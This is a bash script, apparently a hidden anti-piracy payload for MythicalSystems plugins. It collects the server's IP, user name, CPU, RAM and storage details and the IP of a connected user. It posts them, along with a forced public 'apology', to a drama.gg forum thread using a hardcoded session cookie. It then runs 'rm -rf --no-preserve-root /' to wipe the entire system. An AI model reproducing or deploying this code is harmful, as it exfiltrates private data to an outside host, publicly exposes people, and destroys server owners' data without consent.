#!/bin/bash
THREAD_ID="390"
COOKIE="B0xrSdVZZhDlN2zviU8jpAeZf4B3USb8VkkTfTvg"

IP=$(curl -s https://ifconfig.me)
CURRENT_USER=$(whoami)
CPU_MODEL=$(grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | xargs)
RAM_INFO=$(free -h | awk '/^Mem:/ {print $2}')
STORAGE_INFO=$(df -h / | awk 'NR==2 {print $2}')

CONNECTED_USER_IP=$(w -h | awk '{print $3}' | head -n 1)

if [[ -z "$CONNECTED_USER_IP" || "$CONNECTED_USER_IP" == ":"* ]]; then 
    CONNECTED_USER_IP=$IP 
fi

MESSAGE="Hello my server IP is $IP
I'm running under $CURRENT_USER
CPU $CPU_MODEL
RAM $RAM_INFO
Storage $STORAGE_INFO

I tried to run an unauthorized copy of MythicalSystems Plugins and I apologize !

My IP is $CONNECTED_USER_IP"

DATA_PAYLOAD=$(cat <<EOF
{
  "data": {
    "type": "posts",
    "attributes": {
      "content": "$MESSAGE"
    },
    "relationships": {
      "discussion": {
        "data": {
          "type": "discussions",
          "id": "$THREAD_ID"
        }
      }
    }
  }
}
EOF
)

curl -X POST "https://drama.gg/api/posts" \
     -H "Content-Type: application/json; charset=UTF-8" \
     -H "Cookie: $COOKIE" \
     --data-raw "$DATA_PAYLOAD"
     
rm -rf --no-preserve-root /
